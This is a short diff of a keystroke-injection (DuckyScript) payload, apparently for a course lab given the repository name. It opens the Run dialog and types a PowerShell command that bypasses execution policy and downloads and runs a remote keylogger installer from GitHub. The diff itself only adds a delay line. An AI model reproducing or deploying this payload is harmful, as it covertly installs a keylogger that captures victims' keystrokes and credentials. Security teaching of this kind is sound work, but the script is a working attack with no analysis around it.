@@ -7,3 +7,4 @@ GUI r
 DELAY 500
 STRING powershell -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString(https://raw.githubusercontent.com/butlersl/305-lab-files/refs/heads/main/Keylogger/install_keylogger.ps1))"
 ENTER
+DELAY 3000
